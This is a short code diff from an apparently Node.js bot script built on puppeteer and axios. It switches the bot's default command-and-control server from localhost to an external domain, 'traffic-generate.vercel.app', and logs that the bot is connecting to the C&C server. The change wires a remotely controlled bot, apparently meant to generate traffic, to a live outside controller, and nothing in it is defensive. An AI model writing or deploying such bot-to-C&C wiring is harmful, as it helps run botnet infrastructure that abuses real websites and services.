@@ -2,7 +2,7 @@ const puppeteer = require('puppeteer');
 const axios = require('axios');
 
 // Use environment variable or default to localhost
-const C_AND_C_SERVER_URL = process.env.SERVER_URL || 'http://127.0.0.1:3000';
+const C_AND_C_SERVER_URL = process.env.SERVER_URL || 'traffic-generate.vercel.app';
 
 console.log(`[*] Bot starting - connecting to C&C server at: ${C_AND_C_SERVER_URL}`);
 
